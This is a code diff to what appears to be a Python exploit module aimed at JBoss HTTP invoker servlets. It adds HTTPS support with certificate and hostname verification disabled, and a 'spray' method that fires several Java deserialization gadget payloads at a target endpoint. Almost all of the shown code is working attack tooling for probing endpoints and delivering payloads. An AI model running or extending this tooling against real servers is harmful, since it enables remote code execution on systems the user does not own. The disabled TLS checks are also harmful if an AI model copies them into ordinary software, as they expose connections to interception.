@@ -22,6 +22,7 @@ body and the gadget chain executes.
 
 from __future__ import annotations
 
+import ssl
 import urllib.error
 import urllib.request
 from dataclasses import dataclass, field
@@ -68,8 +69,9 @@ class HttpInvoker:
         Network timeout in seconds.
     """
 
-    def __init__(self, timeout: float = 5.0):
+    def __init__(self, timeout: float = 5.0, scheme: str = "http"):
         self.timeout = timeout
+        self.scheme = scheme
 
     def probe_endpoints(self, host: str, port: int) -> list[str]:
         """Return a list of reachable HTTP invoker servlet paths.
@@ -79,7 +81,12 @@ class HttpInvoker:
         servlet exists but the request format was unexpected.
         """
         reachable: list[str] = []
-        base_url = f"http://{host}:{port}"
+        base_url = f"{self.scheme}://{host}:{port}"
+        ctx = None
+        if self.scheme == "https":
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
 
         for path in _DEFAULT_PATHS:
             url = base_url + path
@@ -88,7 +95,7 @@ class HttpInvoker:
                     url,
                     headers={"User-Agent": "Mozilla/5.0"},
                 )
-                urllib.request.urlopen(req, timeout=_HTTP_TIMEOUT)
+                urllib.request.urlopen(req, timeout=_HTTP_TIMEOUT, context=ctx)
                 reachable.append(path)
             except urllib.error.HTTPError as exc:
                 if exc.code not in (404, 401, 403):
@@ -141,8 +148,14 @@ class HttpInvoker:
         payload_bytes: bytes,
     ) -> InvokerExploitResult:
         result = InvokerExploitResult()
-        url = f"http://{host}:{port}{path}"
+        url = f"{self.scheme}://{host}:{port}{path}"
         result.endpoint = url
+
+        ctx = None
+        if self.scheme == "https":
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
 
         try:
             req = urllib.request.Request(
@@ -155,7 +168,7 @@ class HttpInvoker:
                     "User-Agent": "Mozilla/5.0",
                 },
             )
-            resp = urllib.request.urlopen(req, timeout=_HTTP_TIMEOUT)
+            resp = urllib.request.urlopen(req, timeout=_HTTP_TIMEOUT, context=ctx)
             result.sent = True
             result.http_status = resp.status
             body = resp.read(512)
@@ -182,3 +195,26 @@ class HttpInvoker:
             result.error = str(exc)
 
         return result
+
+    def spray(
+        self,
+        host: str,
+        port: int,
+        gadgets_payloads: dict[str, bytes],
+        path: str | None = None,
+    ) -> dict[str, InvokerExploitResult]:
+        """Try multiple gadget payloads and return results keyed by gadget name.
+
+        Parameters
+        ----------
+        host, port:
+            Target JBoss endpoint.
+        gadgets_payloads:
+            Mapping of ``{gadget_name: payload_bytes}``.
+        path:
+            Invoker path to target (auto-detected if ``None``).
+        """
+        results: dict[str, InvokerExploitResult] = {}
+        for name, payload in gadgets_payloads.items():
+            results[name] = self.exploit(host, port, payload, path=path)
+        return results
